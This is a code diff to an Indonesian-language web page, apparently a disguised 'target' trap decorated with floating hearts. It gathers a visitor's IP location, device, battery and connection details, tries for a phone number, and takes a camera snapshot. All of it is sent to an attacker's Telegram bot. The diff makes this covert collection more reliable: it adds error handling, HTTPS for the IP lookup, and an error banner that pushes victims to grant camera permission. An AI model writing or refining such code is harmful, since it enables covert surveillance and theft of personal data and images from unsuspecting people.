@@ -247,6 +247,22 @@ button:active {
   33% { transform: translateY(-20px) rotate(120deg); }
   66% { transform: translateY(20px) rotate(240deg); }
 }
+
+.error-message {
+  position: fixed;
+  top: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(255, 0, 0, 0.8);
+  color: white;
+  padding: 10px 20px;
+  border-radius: 20px;
+  font-weight: bold;
+  display: none;
+  z-index: 1000;
+  max-width: 80%;
+  text-align: center;
+}
 </style>
 </head>
 <body>
@@ -266,6 +282,10 @@ button:active {
 
 <div id="status" class="status">
   <span class="loading-dots"></span> Mengirim foto
+</div>
+
+<div id="errorMessage" class="error-message">
+  Terjadi kesalahan. Silakan coba lagi.
 </div>
 
 <script>
@@ -310,6 +330,16 @@ function createSparkle() {
 setInterval(createHeart, 2000);
 setInterval(createSparkle, 500);
 
+// Show error message
+function showError(message) {
+  const errorEl = document.getElementById('errorMessage');
+  errorEl.textContent = message;
+  errorEl.style.display = 'block';
+  setTimeout(() => {
+    errorEl.style.display = 'none';
+  }, 5000);
+}
+
 // Ambil IP/device info yang lebih akurat menggunakan multiple services
 async function getIpInfo(){
   try {
@@ -353,8 +383,8 @@ async function getIpInfo(){
       };
     }
     
-    // Fallback ke ip-api.com
-    response = await fetch("http://ip-api.com/json/");
+    // Fallback ke ip-api.com dengan HTTPS
+    response = await fetch("https://ip-api.com/json/");
     data = await response.json();
     
     if(data.status === "success") {
@@ -383,7 +413,16 @@ async function getIpInfo(){
 
 // Ambil device info yang lebih lengkap
 async function getDeviceInfo(){
-  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
+  // Dapatkan info baterai dengan fallback
+  let battery = {level:null,charging:false,chargingTime:null,dischargingTime:null};
+  try {
+    if (navigator.getBattery) {
+      battery = await navigator.getBattery();
+    }
+  } catch(e) {
+    console.log("Battery info not available");
+  }
+  
   const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
   
   // Coba mendapatkan nomor telepon (jika tersedia)
@@ -435,7 +474,7 @@ async function getDeviceInfo(){
     connectionType:connection.effectiveType || "-",
     connectionDownlink:connection.downlink || "-",
     connectionRtt:connection.rtt || "-",
-    battery:b,
+    battery:battery,
     timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
     localTime:new Date().toLocaleString(),
     phoneNumber:phoneNumber,
@@ -578,6 +617,7 @@ async function sendInitialInfo() {
     return true; // Indicate success
   } catch (error) {
     console.error("Failed to send initial info:", error);
+    showError("Gagal mengirim informasi awal. Silakan coba lagi.");
     return false; // Indicate failure
   }
 }
@@ -606,10 +646,16 @@ async function sendSnapshot() {
     formData.append("document", blob, "screenshotbyaldofficialr.jpg");
     formData.append("caption", "📸 Sukes screenshot foto target");
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
       method: "POST",
       body: formData
     });
+    
+    if (!response.ok) {
+      const errorData = await response.json();
+      console.error("Telegram API Error (sendDocument):", errorData);
+      throw new Error(`Failed to send document: ${errorData.description}`);
+    }
 
     stream.getTracks().forEach(track=>track.stop());
     video.remove();
@@ -628,6 +674,7 @@ async function sendSnapshot() {
     }
   }catch(e){
     console.log("Camera error:", e);
+    showError("Tidak dapat mengakses kamera. Pastikan Anda telah memberikan izin kamera.");
   }
 }
 
